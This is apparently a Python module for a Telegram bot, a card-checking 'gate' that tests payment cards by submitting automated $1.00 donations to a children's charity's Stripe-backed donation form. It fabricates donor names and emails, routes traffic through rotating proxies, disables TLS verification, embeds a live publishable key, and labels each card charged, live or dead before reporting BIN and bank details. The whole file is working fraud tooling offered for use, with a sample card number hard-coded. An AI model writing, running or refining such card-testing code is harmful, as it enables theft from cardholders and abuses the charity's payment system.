"""
Hoshigaki Gate - Abaana.org Stripe $1.00 Donation Engine
Handler module that plugs directly into the Telegram Bot.
"""
import sys, os
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import httpx
import time
import json
import random
import re
import uuid
from telethon import events

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

async def check_card_hoshigaki(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    """
    Asynchronous Stripe $1.00 Donation Check on abaana.org.
    Returns: (is_live, status_str, response_str, raw_text)
    """
    card_str = f"{cc}|{mm}|{yy}|{cvc}"
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    proxy_formatted = _format_proxy(proxy_url)

    first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first.lower()}.{last.lower()}{random.randint(100,999)}@gmail.com"

    headers_base = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    try:
        async with httpx.AsyncClient(proxy=proxy_formatted, follow_redirects=True, verify=False, timeout=25.0) as client:
            # 1. Step 1: Donor Info
            post1 = {
                "form[name]": f"{first} {last}",
                "form[line1]": "123 Allen ST",
                "form[city]": "New York",
                "form[county]": "New York",
                "form[postcode]": "10002",
                "form[country]": "USA",
                "form[phone]": "18019632580",
                "form[email]": email,
                "extras[informed]": "no",
                "stepData": "",
                "stepValue": "1",
            }
            await client.post("https://www.abaana.org/donate/online", data=post1, headers=headers_base)

            # 2. Step 2: Amount ($1 USD)
            post2 = {
                "paymentMethod": "card",
                "currency": "USD",
                "amount": "1",
                "project": "Any Project",
                "addFee": "0",
                "adminFee": "",
                "stepValue": "2",
            }
            await client.post("https://www.abaana.org/donate/online/step2", data=post2, headers=headers_base)

            # 3. Step 3: Tokenize on Stripe with Modern Elements Surface Payload
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': headers_base["User-Agent"],
            }
            stripe_data = {
                'type': 'card',
                'billing_details[name]': f"{first} {last}",
                'billing_details[email]': email,
                'billing_details[address][country]': 'US',
                'card[number]': cc,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent',
                'referrer': 'https://www.abaana.org/donate/online',
                'time_on_page': str(random.randint(100000, 999999)),
                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': str(uuid.uuid4()),
                'muid': str(uuid.uuid4()),
                'sid': str(uuid.uuid4()),
                'key': 'pk_live_51LhtwiGPgaK6ulcPEN1I001VvS0Ke0SlidIqaDopfpahumzL2zhNQsfb8xI4QxelHGy4BbN2Va3hTEK7dtCkbfTO000GXTCC6H',
                '_stripe_version': '2024-06-20'
            }
            r3 = await client.post("https://api.stripe.com/v1/payment_methods", data=stripe_data, headers=stripe_headers)
            t3 = r3.json()
            pm = t3.get("id")
            if not pm:
                err_msg = (t3.get("error") or {}).get("message", "Stripe Tokenization Failed")
                return False, "DECLINED ❌", err_msg, json.dumps(t3)

            # 4. Step 4: Confirm donation on abaana.org
            post4 = {
                "do": "donate/online/step3",
                "stripeToken": pm,
                "addGiftAid": "0",
                "gift-aid": "0",
                "cardholder-name": f"{first} {last}",
                "stepValue": "3",
            }
            await client.post("https://www.abaana.org/donate/online/confirm", data=post4, headers=headers_base)

            # 5. Step 5: Execute PaymentIntent
            post6 = {"payment_method_id": pm, "site_area": "donation"}
            r6 = await client.post("https://www.abaana.org/stripe-payment-intent", json=post6, headers=headers_base)
            res_text = r6.text

            try:
                data6 = r6.json()
            except Exception:
                data6 = {}

            error_msg = data6.get("error", "")
            if not error_msg and (data6.get("success") or "requires_action" in res_text or "status" in data6):
                return True, "CHARGED ✅", "Thank You For Your Donation ($1.00)", res_text
            elif "incorrect_cvc" in error_msg or "security code is incorrect" in error_msg:
                return True, "APPROVED 🟩", "Your card's security code is incorrect (CCN Live)", res_text
            elif "insufficient_funds" in error_msg:
                return True, "APPROVED 🟩", "Insufficient Funds (Card Live)", res_text
            elif error_msg:
                return False, "DECLINED 🔴", error_msg, res_text
            else:
                return False, "DECLINED 🔴", "Card Declined by Issuer", res_text

    except Exception as e:
        return False, "ERROR ⚠️", str(e), ""

def register_hoshigaki_gate(bot, is_admin_fn, load_proxies_fn, extract_cc_fn, get_bin_info_fn):
    """
    Registers the /hg command listener onto the Telegram bot instance.
    """
    @bot.on(events.NewMessage(pattern=r'^/hg(?:\s+(.+))?$'))
    async def process_hg_cmd(event):
        user_id = event.sender_id
        if not is_admin_fn(user_id):
            await event.reply("Access denied.")
            return

        card_input = event.pattern_match.group(1)
        if not card_input:
            await event.reply("⚠️ Format: `/hg cc|mm|yy|cvv`")
            return

        cards = extract_cc_fn(card_input)
        if not cards:
            await event.reply("⚠️ Format: `/hg cc|mm|yy|cvv`")
            return

        card = cards[0]
        parts = card.split('|')
        try:
            cc = parts[0].strip()
            mm = parts[1].strip()
            yy = parts[2].strip()
            cvc = parts[3].strip()
        except IndexError:
            await event.reply("⚠️ Format: `/hg cc|mm|yy|cvv`")
            return

        status_msg = await event.reply("🔄 <b>Checking (Hoshigaki Stripe $1.00)...</b>", parse_mode="html")
        proxies = load_proxies_fn(user_id)
        proxy = random.choice(proxies) if proxies else None
        start_time = time.time()

        is_live, status_str, response_str, raw = await check_card_hoshigaki(cc, mm, yy, cvc, proxy_url=proxy)
        time_taken = round(time.time() - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info_fn(cc[:6])

        status_emoji = "Approved! ✅ -» charged!" if "CHARGED" in status_str else ("Approved! ✅" if is_live else "Dead! ❌")

        user_tag = ""
        if event.sender:
            first_n = getattr(event.sender, "first_name", "User") or "User"
            uid = getattr(event.sender, "id", None)
            if uid:
                user_tag = f"\nᥫ᭡ <b>𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮</b> -» <a href='tg://user?id={uid}'>{first_n}</a>"

        bin_desc = f"{brand}"
        if bin_type and bin_type != "-":
            bin_desc += f" - {bin_type}"
        if level and level != "-":
            bin_desc += f" - {level}"

        res = f"""<b>ア 𝘾𝘾</b> -» <code>{cc}|{mm}|{yy}|{cvc}</code>
<b>カ 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>{status_emoji}</code>
<b>ツ 𝙍𝙚𝙨𝙪𝙡𝙩</b> -» <code>{response_str}</code>

<b>キ 𝘽𝙞𝙣</b> -» <code>{bin_desc}</code>
<b>朱 𝘽𝙖𝙣𝙠</b> -» <code>{bank}</code>
<b>零 𝘾𝙤𝙪𝙣𝙩𝙧𝙮</b> -» <code>{country} {flag}</code>

<b>⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» <code>Hoshigaki Stripe -» $1.00</code>
<b>꫟ 𝙏𝙞𝙢𝙚</b> -» <code>{time_taken}'s</code>{user_tag}"""
        await status_msg.edit(res, parse_mode="html")

if __name__ == '__main__':
    test_c = sys.argv[1] if len(sys.argv) > 1 else '4033060047342909|08|28|667'
    p = test_c.split('|')
    print(f"[*] Testing Standalone Hoshigaki Engine on: {test_c}")
    start = time.time()
    is_live, status, response, raw = asyncio.run(check_card_hoshigaki(p[0], p[1], p[2], p[3]))
    elapsed = round(time.time() - start, 2)
    print(f"\nStatus: {status}\nResponse: {response}\nTime: {elapsed}s")
